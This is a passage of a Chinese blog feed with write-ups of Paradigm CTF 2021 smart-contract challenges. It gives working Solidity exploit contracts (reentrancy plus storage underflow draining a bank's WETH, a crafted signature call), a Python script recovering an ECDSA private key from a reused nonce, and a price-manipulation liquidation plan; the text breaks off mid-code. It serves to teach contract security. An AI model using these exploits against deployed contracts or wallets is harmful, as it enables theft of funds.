class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract lockBoxExploit &#123;<br>    Entrypoint public entrypoint;<br>    constructor(address _setup) public &#123;<br>        entrypoint = lockBoxSetup(_setup).entrypoint();<br>    &#125;<br>    function exploit() public &#123;<br>        bytes memory data = abi.encodePacked(<br>            entrypoint.solve.selector,<br>            uint(uint16(0xff1c) | (uint256(bytes32(bytes4(blockhash(block.number - 1))))),<br>            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), //r<br>            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e98), //s<br>            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e9a), //满足差值偶数<br>            bytes32(keccak256(&#x27;choose&#x27;)),<br>            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), // =r<br>            bytes32(0x0000000000000000000000000000000000000000000000000000000000000004)  //做的choice 也就是指向abi.encodePakced(&quot;choose&quot;)的指针<br>        );<br>        uint size = data.length;<br>        address entry = address(entrypoint);<br>        assembly&#123;<br>            switch call(gas(),entry,0,add(data,0x20),size,0,0)<br>            case 0 &#123;<br>                returndatacopy(0x00,0x00,returndatasize())<br>                revert(0, returndatasize())<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="BANK"><a href="#BANK" class="headerlink" title="BANK"></a>BANK</h2><p>要求是清空bank合约中的50个WETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() external view returns (bool) &#123;<br>    return weth.balanceOf(address(bank)) == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>阅读bank代码可以发现</p><ul><li><p>depositToken, withdrawToken等函数都没有防止重入的措施</p><ul><li>没有<code>nonReentry</code>修饰符</li></ul></li><li><p>存在数组越界情况</p><ul><li><p><code>accounts[msg.sender].length--;</code>  </p><p>如果此时的 <code>accounts[msg.sender].length == 0</code> ,则会使得 <code>accounts[msg.sender].length</code> 下溢出</p><p>由此可以满足 <code>setAccountName</code> 的条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setAccountName(uint accountId, string name) external &#123;<br>    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);<br><br>    accounts[msg.sender][accountId].accountName = name;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>account.uniqueTokens--;</code></p></li></ul></li><li><p>复杂的数据结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Account &#123;<br>    string accountName;<br>    uint uniqueTokens;<br>    mapping(address =&gt; uint) balances;<br>&#125;<br><br>mapping(address =&gt; Account[]) accounts;<br></code></pre></td></tr></table></figure><p>结合 <code>setAccountName</code> 函数，可以在任何我们感兴趣的<a href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">Storage</a>进行写入</p></li></ul><p>于是想到可以先利用重入使 <code>accounts[msg.sender].length</code> 下溢，再在Storage写入我感兴趣的值，比如我的账户的WETH的余额等，然后再调用<code>withdraw</code>函数取出合约中所有的WETH到我的账户上。</p><h3 id="重入和下溢"><a href="#重入和下溢" class="headerlink" title="重入和下溢"></a>重入和下溢</h3><p>分析<code>withdarwToken</code>函数发现，有如下两个函数涉及到外部合约的调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">ERC20Like(token).balanceOf(msg.sender)<br>ERC20Like(token).transferFrom(msg.sender, address(this), amount)<br></code></pre></td></tr></table></figure><p>并且withdarwToken和closeLastAccount都会涉及到 <code>accounts[msg.sender].length--;</code>  </p><p>由此得到一个重入逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">deposit(0, address(this), 0) // 第一次调用balanceOf重入,len=1,uniqueTokens == 0<br>    withdraw(0, address(this), 0) // 第二次调用balanceOf重入,len=1,uniqueTokens == 0<br>        deposit(0, address(this), 0) // 第三次调用balanceOf重入,len=1,uniqueTokens == 0<br>              closeLastAccount() // (通过检查 .length &gt; 0 &amp;&amp; uniqueTokens == 0)<br>        deposit 继续执行并将 uniqueTokens 设置为 1 <br>    withdraw 继续执行并再次删除帐户（通过 uniqueTokens == 1 检查） <br>deposit 继续执行，我们不关心它的作用<br></code></pre></td></tr></table></figure><p>代码实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">reentrancyState = 1;<br>bank.depositToken(0, address(this), 0);  <br><br>function balanceOf(address  who ) public returns (uint256) &#123;<br>uint result = balances[who];<br><br>    if (reentrancyState == 1) &#123;<br>        reentrancyState++;<br>        bank.withdrawToken(0, this, 0);<br>    &#125; else if (reentrancyState == 2) &#123;<br>        reentrancyState++;<br>        bank.depositToken(0, this, 0);<br>    &#125; else if (reentrancyState == 3) &#123;<br>        reentrancyState++;<br>        bank.closeLastAccount();<br>    &#125;<br><br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="任意写入"><a href="#任意写入" class="headerlink" title="任意写入"></a>任意写入</h3><p>再看一下 <code>setAccountName</code> 函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setAccountName(uint accountId, string name) external &#123;<br>    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);<br><br>    accounts[msg.sender][accountId].accountName = name;<br>&#125;<br></code></pre></td></tr></table></figure><p>联系数据结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Account &#123;<br>    string accountName;<br>    uint uniqueTokens;<br>    mapping(address =&gt; uint) balances;<br>&#125;<br><br>mapping(address =&gt; Account[]) accounts;<br></code></pre></td></tr></table></figure><p>可以想到计算出一个accountId</p><p>可以通过 <code>setAccountName</code> 来设置WETH的余额</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.accountName) == slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.balances<span class="hljs-comment">[WETH]</span>)<br><br>slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.accountName) = <br>&#123;<br>base_key = keccak(abi.encodePacked(msg.sender, 0x02)); //mapping(address =&gt; Account<span class="hljs-comment">[]</span>)<br>acc_key = keccak(base_key) + 3 * accountId //Account<span class="hljs-comment">[]</span> 类似于动态数组 且Account占三个slot<br>accountName_key = acc_key + 0x00 //accountName处于第一位<br>&#125;<br><br>slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.balances<span class="hljs-comment">[WETH]</span>) = <br>&#123;<br>    base_key2 = keccak(abi.encodePacked(msg.sender, 0x02));<br>acc_key2 = keccak(base_key2) + 3 * accountId<br>balances<span class="hljs-comment">[WETH]</span>_key = keccak(abi.encodePacked(address(WETH), acc_key2+0x02)) //balances处于第三位<br>&#125;<br></code></pre></td></tr></table></figure><p>由此可以得到以下攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract BadToken is ERC20Like &#123;<br>    mapping(address =&gt; uint) balances;<br><br>    uint stage = 0;<br><br>    function transfer(address dst, uint qty) public returns (bool) &#123;<br>        balances[msg.sender] -= qty;<br>        balances[dst] += qty;<br>        return true;<br>    &#125;<br><br>    function transferFrom(address src, address dst, uint qty) public returns (bool) &#123;<br>        balances[src] -= qty;<br>        balances[dst] += qty;<br>        return true;<br>    &#125;<br><br>    function approve(address, uint) public returns (bool) &#123;<br>        return true;<br>    &#125;<br><br>    function balanceOf(address who) public view returns (uint) &#123;<br>        uint result = balances[who];<br><br>        if (reentrancyState == 1) &#123;<br>            reentrancyState++;<br>            bank.withdrawToken(0, this, 0);<br>        &#125; else if (reentrancyState == 2) &#123;<br>            reentrancyState++;<br>            bank.depositToken(0, this, 0);<br>        &#125; else if (reentrancyState == 3) &#123;<br>            reentrancyState++;<br>            bank.closeLastAccount();<br>        &#125;<br><br>        return result;<br>    &#125;<br><br>    Bank private bank;<br>    WETH9 private weth;<br>    uint public reentrancyState;<br><br>    function exploit(bankSetup setup) public &#123;<br>        bank = setup.bank();<br>        weth = setup.weth();<br><br>        reentrancyState = 1;<br>        bank.depositToken(0, address(this), 0);<br><br>        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));<br>        bytes32 myArrayStart = keccak256(myArraySlot);<br><br>        uint account = 0;<br>        uint slotsNeeded;<br>        while (true) &#123;<br>            bytes32 account0Start = bytes32(uint(myArrayStart) + 3*account);<br>            bytes32 account0Balances = bytes32(uint(account0Start) + 2);<br>            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);<br><br>            slotsNeeded = (uint(-1) - uint(myArrayStart));<br>            slotsNeeded++;<br>            slotsNeeded += uint(wethBalance);<br>            if (uint(slotsNeeded) % 3 == 0) &#123;<br>                break;<br>            &#125;<br>            account++;<br>        &#125;<br><br>        uint accountId = uint(slotsNeeded) / 3;<br><br>        bank.setAccountName(accountId, string(abi.encodePacked(bytes31(uint248(uint(-1))))));<br><br>        bank.withdrawToken(account, address(weth), weth.balanceOf(address(bank)));<br>    &#125;<br>&#125;<br><br>contract bankExploit &#123;<br>    constructor(bankSetup setup) public &#123;<br>        new BadToken().exploit(setup);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://sissice.github.io/2022/09/18/ParadigmCTF2021one/&quot;&gt;Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="靶场刷题" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/"/>
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Writeup | Paradigm CTF 2021 Part one</title>
    <link href="http://example.com/2022/09/18/ParadigmCTF2021one/"/>
    <id>http://example.com/2022/09/18/ParadigmCTF2021one/</id>
    <published>2022-09-18T08:35:19.000Z</published>
    <updated>2022-10-03T13:52:19.607Z</updated>
    
    <content type="html"><![CDATA[<p> <a href="https://ctf.paradigm.xyz/">Paradigm CTF 2021</a></p><p> <a href="https://github.com/paradigmxyz/paradigm-ctf-2021">Paradigm CTF 2021代码库</a> </p><p><a href="https://github.com/Sissice/Paradigm-CTF-2021-wp">完整wp代码仓库</a></p><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO"></a>HELLO</h2><p>送分题，调用solve即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const &#123; expect &#125; = require(&quot;chai&quot;);<br><br>describe(&quot;hello&quot;, function() &#123;<br>    let attacker;<br>    it(&quot;should return the solved&quot;, async function()&#123;<br>        [attacker] = await ethers.getSigners();<br><br>        const Setup = await ethers.getContractFactory(&quot;Setup&quot;,attacker);<br>        const setup = await Setup.deploy();<br><br>        const helloAddr = await setup.hello();<br>        const hello = await ethers.getContractAt(&quot;Hello&quot;, helloAddr, attacker);<br><br>        await hello.solve();<br>        expect(await setup.isSolved()).to.equal(true);<br>    &#125;)<br>    &#125;<br>)<br></code></pre></td></tr></table></figure><h2 id="SECURE"><a href="#SECURE" class="headerlink" title="SECURE"></a>SECURE</h2><p>这句是将setup中的WETH转走，此时balance为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">wallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value));<br></code></pre></td></tr></table></figure><p>如果<code>Setup</code>合约有 50 (W)ETH，挑战就解决了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const &#123; expect &#125; = require(&quot;chai&quot;);<br>const &#123; ethers &#125; = require(&#x27;hardhat&#x27;);<br><br>describe(&quot;secure&quot;, function() &#123;<br>        let attacker,deployer;<br>        it(&quot;should return the solved&quot;, async function()&#123;<br>            [attacker,deployer] = await ethers.getSigners();<br><br>            const WETH = await ethers.getContractAt(&quot;WETH9&quot;, &quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;, attacker);<br><br>            const Setup = await ethers.getContractFactory(&quot;secureSetup&quot;,attacker);<br>            const setup = await Setup.deploy(&#123;<br>                value: ethers.utils.parseEther(&quot;50.0&quot;)<br>            &#125;);<br>            expect(await WETH.balanceOf(setup.address)).to.equal(0);<br><br>            await WETH.deposit(&#123;<br>                value: ethers.utils.parseEther(&quot;50.0&quot;)<br>            &#125;);<br><br>//转账<br>            await WETH.transfer(setup.address,setup.WANT())<br>            expect(await setup.isSolved()).to.equal(true);<br>        &#125;)<br>    &#125;<br>)<br><br></code></pre></td></tr></table></figure><h2 id="BABYCRYPTO"><a href="#BABYCRYPTO" class="headerlink" title="BABYCRYPTO"></a>BABYCRYPTO</h2><p>通关要求是验签成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pub.verifies(test, ecdsa.Signature(r, s)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;better luck next time&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>可以发现每一次的r都是相同的</p><p><img src="/2022/09/18/ParadigmCTF2021one/image-20220905221931560.png" alt="image-20220905221931560"></p><p>由此可以联想到[capture the ether —— Account Takeover](<a href="https://sissice.github.io/2022/04/02/capture">https://sissice.github.io/2022/04/02/capture</a> the ether wp/)</p><p>我们可以利用两个相同的r计算出私钥，再利用私钥对消息进行签名，最后解析出签名中的r和s即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> SystemRandom<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> ecdsa<br><span class="hljs-keyword">import</span> sha3<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span><br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash_message</span>(<span class="hljs-params">msg: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    hash the message using keccak256, truncate if necessary</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    k = sha3.keccak_256()<br>    k.update(msg.encode(<span class="hljs-string">&quot;utf8&quot;</span>))<br>    d = k.digest()<br>    n = <span class="hljs-built_in">int</span>(binascii.hexlify(d), <span class="hljs-number">16</span>)<br>    olen = ecdsa.generator_secp256k1.order().bit_length() <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><br>    dlen = <span class="hljs-built_in">len</span>(d)<br>    n &gt;&gt;= <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, dlen - olen)<br>    <span class="hljs-keyword">return</span> n<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modInverse</span>(<span class="hljs-params">b,m</span>):</span><br>  g = math.gcd(b, m)<br>  <span class="hljs-keyword">if</span> (g != <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(b, m - <span class="hljs-number">2</span>, m)<br><br><span class="hljs-comment"># Function to compute a/b under modulo m</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modDivide</span>(<span class="hljs-params">a,b,m</span>):</span><br>  a = a % m<br>  inv = modInverse(b,m)<br>  <span class="hljs-keyword">if</span>(inv == -<span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Division not defined&quot;</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> (inv*a) % m<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    msg1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;msg1? &quot;</span>)<br>    msg1_hashed = hash_message(msg1)<br>    msg2 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;msg2? &quot;</span>)<br>    msg2_hashed = hash_message(msg2)<br>    r1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;r1? &quot;</span>), <span class="hljs-number">16</span>)<br>    s1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;s1? &quot;</span>), <span class="hljs-number">16</span>)<br>    s2 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;s2? &quot;</span>), <span class="hljs-number">16</span>)<br><br>    g = ecdsa.generator_secp256k1<br>    n = g.order()<br><br>    k = modDivide((msg1_hashed - msg2_hashed), (s1 - s2), n)<br><br>    d = modDivide(((s1 * k) - msg1_hashed), r1, n)<br><br>    test = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;test? &quot;</span>), <span class="hljs-number">16</span>)<br><br>    pub = ecdsa.Public_key(g, g * d)<br>    priv = ecdsa.Private_key(pub, d)<br><br>    sig = priv.sign(test, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;solved r=0x<span class="hljs-subst">&#123;sig.r:032x&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;solved s=0x<span class="hljs-subst">&#123;sig.s:032x&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BROKER"><a href="#BROKER" class="headerlink" title="BROKER"></a>BROKER</h2><p>完成挑战的条件是合约broker持有的weth少于5 ether</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>       return weth.balanceOf(address(broker)) &lt; 5 ether;<br>   &#125;<br></code></pre></td></tr></table></figure><p>而Broker 中的初始余额为 25 WETH 和 500,000 Token</p><p>broker中可以转出WETH的函数有两个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint256 amount) public &#123;<br>    deposited[msg.sender] -= amount;<br>    require(safeDebt(msg.sender) &gt;= debt[msg.sender], &quot;err: undercollateralized&quot;);<br><br>    weth.transfer(msg.sender, amount);<br>&#125;<br><br>function liquidate(address user, uint256 amount) public returns (uint256) &#123;<br>    require(safeDebt(user) &lt;= debt[user], &quot;err: overcollateralized&quot;);<br>    debt[user] -= amount;<br>    token.transferFrom(msg.sender, address(this), amount);<br>    uint256 collateralValueRepaid = amount / rate();<br>    weth.transfer(msg.sender, collateralValueRepaid);<br>    return collateralValueRepaid;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中withdraw需要满足safeDebt(msg.sender) &gt;= debt[msg.sender]</p><p>liquidate需要满足safeDebt(user) &lt;= debt[user]</p><p>safeDebt 由 deposited[user] 和 rate() 决定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function rate() public view returns (uint256) &#123;<br>    (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();<br>    uint256 _rate = uint256(_reserve0 / _reserve1);<br>    return _rate;<br>&#125;<br>function safeDebt(address user) public view returns (uint256) &#123;<br>    return deposited[user] * rate() * 2 / 3;<br>&#125;<br></code></pre></td></tr></table></figure><p>broker是一家超额抵押贷款银行。以 WETH 作为抵押，提供 Token 作为借贷。当抵押品被认为抵押不足时，该账户可以被清算。正如我们之前提到的，抵押因子将根据 Uniswap 交易对的价格来决定。</p><p>攻击思路（生产环境没有足够多的ETH，中可以在一个闪贷中完成攻击）：</p><ol><li><code>Deposit</code> WETH 作为抵押品。</li><li>尽可能多的“借”Token，让清算更容易。</li><li>在 Uniswap 交易对中购买 Token，提升 Token 价格。</li><li>由于 Token 价格上涨，我们使用的账户抵押不足。</li><li><code>清算</code>账户，偿还适当数量的Token以提取Broker中的WETH。</li></ol><p><a href="https://cloud.tencent.com/developer/article/2010561">Uniswap V2 中的swap</a></p><p><a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol">UniswapV2Router02.sol</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>interface Router &#123;<br>    function swapExactTokensForTokens(<br>        uint amountIn,<br>        uint amountOutMin,<br>        address[] calldata path,<br>        address to,<br>        uint deadline<br>    ) external returns (uint[] memory 